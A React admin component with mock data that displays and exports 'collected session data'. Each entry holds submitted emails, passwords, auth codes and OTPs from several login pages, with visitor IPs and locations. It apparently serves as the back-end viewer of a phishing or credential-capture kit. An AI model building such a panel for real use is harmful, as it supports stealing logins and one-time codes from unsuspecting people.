
import React, { useState } from 'react';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Input } from '@/components/ui/input';
import { Button } from '@/components/ui/button';
import { Label } from '@/components/ui/label';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { Database, Download, Filter, Search } from 'lucide-react';

// Mock data for the component
const mockSessionData = [
  {
    sessionId: 'ses_123456',
    pageType: 'login1',
    userId: 'user1',
    userEmail: 'user@example.com',
    entries: [
      {
        id: 'entry1',
        timestamp: '2023-05-01T12:30:00Z',
        ipAddress: '192.168.1.1',
        location: 'New York, USA',
        data: { email: 'visitor1@example.com', password: '********' }
      },
      {
        id: 'entry2',
        timestamp: '2023-05-01T14:45:00Z',
        ipAddress: '192.168.1.2',
        location: 'Los Angeles, USA',
        data: { email: 'visitor2@example.com', password: '********' }
      }
    ]
  },
  {
    sessionId: 'ses_789012',
    pageType: 'login2',
    userId: 'user2',
    userEmail: 'user2@example.com',
    entries: [
      {
        id: 'entry3',
        timestamp: '2023-05-02T09:15:00Z',
        ipAddress: '192.168.1.3',
        location: 'London, UK',
        data: { auth_code: '123456' }
      }
    ]
  },
  {
    sessionId: 'ses_345678',
    pageType: 'login3',
    userId: 'user1',
    userEmail: 'user@example.com',
    entries: [
      {
        id: 'entry4',
        timestamp: '2023-05-03T16:20:00Z',
        ipAddress: '192.168.1.4',
        location: 'Toronto, Canada',
        data: { otp: '987654' }
      },
      {
        id: 'entry5',
        timestamp: '2023-05-03T18:10:00Z',
        ipAddress: '192.168.1.5',
        location: 'Sydney, Australia',
        data: { otp: '456789' }
      },
      {
        id: 'entry6',
        timestamp: '2023-05-03T21:05:00Z',
        ipAddress: '192.168.1.6',
        location: 'Tokyo, Japan',
        data: { otp: '135790' }
      }
    ]
  }
];

const AdminData = () => {
  const [searchQuery, setSearchQuery] = useState('');
  const [pageTypeFilter, setPageTypeFilter] = useState('');
  const [userFilter, setUserFilter] = useState('');
  const [filteredData, setFilteredData] = useState(mockSessionData);

  const applyFilters = () => {
    let filtered = mockSessionData;
    
    if (searchQuery) {
      filtered = filtered.filter(session => 
        session.sessionId.includes(searchQuery) || 
        session.entries.some(entry => 
          entry.ipAddress.includes(searchQuery) || 
          entry.location.includes(searchQuery) ||
          JSON.stringify(entry.data).includes(searchQuery)
        )
      );
    }
    
    if (pageTypeFilter) {
      filtered = filtered.filter(session => session.pageType === pageTypeFilter);
    }
    
    if (userFilter) {
      filtered = filtered.filter(session => session.userId === userFilter);
    }
    
    setFilteredData(filtered);
  };

  const resetFilters = () => {
    setSearchQuery('');
    setPageTypeFilter('');
    setUserFilter('');
    setFilteredData(mockSessionData);
  };

  const exportData = () => {
    const dataStr = `data:text/json;charset=utf-8,${encodeURIComponent(
      JSON.stringify(filteredData, null, 2)
    )}`;
    const downloadAnchorNode = document.createElement('a');
    downloadAnchorNode.setAttribute('href', dataStr);
    downloadAnchorNode.setAttribute('download', 'session_data.json');
    document.body.appendChild(downloadAnchorNode);
    downloadAnchorNode.click();
    downloadAnchorNode.remove();
  };

  const getUniquePageTypes = () => {
    return Array.from(new Set(mockSessionData.map(session => session.pageType)));
  };

  const getUniqueUsers = () => {
    return Array.from(new Set(mockSessionData.map(session => session.userId)));
  };

  const formatTimestamp = (timestamp: string) => {
    return new Date(timestamp).toLocaleString();
  };

  return (
    <div className="container mx-auto animate-fade-in">
      <div className="flex justify-between items-center mb-8">
        <div>
          <h1 className="text-3xl font-bold">Session Data</h1>
          <p className="text-muted-foreground">View and export collected session data</p>
        </div>
        <Button onClick={exportData}>
          <Download className="mr-2 h-4 w-4" /> Export All Data
        </Button>
      </div>

      <Card className="mb-6">
        <CardHeader>
          <CardTitle className="text-lg">Data Filters</CardTitle>
        </CardHeader>
        <CardContent>
          <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
            <div>
              <Label htmlFor="search">Search</Label>
              <div className="flex items-center mt-1">
                <Input 
                  id="search" 
                  placeholder="Search session ID, IP, or data..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="flex-1"
                />
                <Button variant="ghost" size="icon" className="ml-2">
                  <Search className="h-4 w-4" />
                </Button>
              </div>
            </div>
            
            <div>
              <Label htmlFor="pageType">Page Type</Label>
              <Select value={pageTypeFilter} onValueChange={setPageTypeFilter}>
                <SelectTrigger id="pageType" className="mt-1">
                  <SelectValue placeholder="All Page Types" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="">All Page Types</SelectItem>
                  {getUniquePageTypes().map(pageType => (
                    <SelectItem key={pageType} value={pageType}>{pageType}</SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
            
            <div>
              <Label htmlFor="user">User</Label>
              <Select value={userFilter} onValueChange={setUserFilter}>
                <SelectTrigger id="user" className="mt-1">
                  <SelectValue placeholder="All Users" />
                </SelectTrigger>
                <SelectContent>
                  <SelectItem value="">All Users</SelectItem>
                  {getUniqueUsers().map(userId => (
                    <SelectItem key={userId} value={userId}>{userId}</SelectItem>
                  ))}
                </SelectContent>
              </Select>
            </div>
          </div>
          
          <div className="flex justify-end mt-4">
            <Button variant="outline" onClick={resetFilters} className="mr-2">
              Reset
            </Button>
            <Button onClick={applyFilters}>
              <Filter className="mr-2 h-4 w-4" /> Apply Filters
            </Button>
          </div>
        </CardContent>
      </Card>

      {filteredData.length === 0 ? (
        <div className="bg-card rounded-lg p-8 text-center border">
          <div className="mb-4 text-muted-foreground">
            <Database className="h-12 w-12 mx-auto" />
          </div>
          <h3 className="text-lg font-medium mb-2">No data found</h3>
          <p className="text-muted-foreground mb-4">Try adjusting your filters</p>
          <Button variant="outline" onClick={resetFilters}>
            Reset Filters
          </Button>
        </div>
      ) : (
        <div>
          {filteredData.map(session => (
            <Card key={session.sessionId} className="mb-6">
              <CardHeader className="pb-3">
                <div className="flex justify-between items-center">
                  <CardTitle>Session: {session.sessionId}</CardTitle>
                  <Button variant="outline" size="sm" onClick={() => {
                    const dataStr = `data:text/json;charset=utf-8,${encodeURIComponent(
                      JSON.stringify(session, null, 2)
                    )}`;
                    const downloadAnchorNode = document.createElement('a');
                    downloadAnchorNode.setAttribute('href', dataStr);
                    downloadAnchorNode.setAttribute('download', `${session.sessionId}.json`);
                    document.body.appendChild(downloadAnchorNode);
                    downloadAnchorNode.click();
                    downloadAnchorNode.remove();
                  }}>
                    <Download className="mr-2 h-4 w-4" /> Export Session
                  </Button>
                </div>
                <div className="flex flex-wrap gap-6 text-sm text-muted-foreground mt-2">
                  <div>
                    <span className="font-medium">Page Type:</span> {session.pageType}
                  </div>
                  <div>
                    <span className="font-medium">User:</span> {session.userEmail}
                  </div>
                  <div>
                    <span className="font-medium">Entries:</span> {session.entries.length}
                  </div>
                </div>
              </CardHeader>
              <CardContent>
                <Table>
                  <TableHeader>
                    <TableRow>
                      <TableHead>Timestamp</TableHead>
                      <TableHead>IP Address</TableHead>
                      <TableHead>Location</TableHead>
                      <TableHead>Submitted Data</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {session.entries.map(entry => (
                      <TableRow key={entry.id}>
                        <TableCell>{formatTimestamp(entry.timestamp)}</TableCell>
                        <TableCell>{entry.ipAddress}</TableCell>
                        <TableCell>{entry.location}</TableCell>
                        <TableCell>
                          <pre className="text-xs p-2 bg-secondary rounded-md overflow-x-auto">
                            {JSON.stringify(entry.data, null, 2)}
                          </pre>
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </CardContent>
            </Card>
          ))}
        </div>
      )}
    </div>
  );
};

export default AdminData;
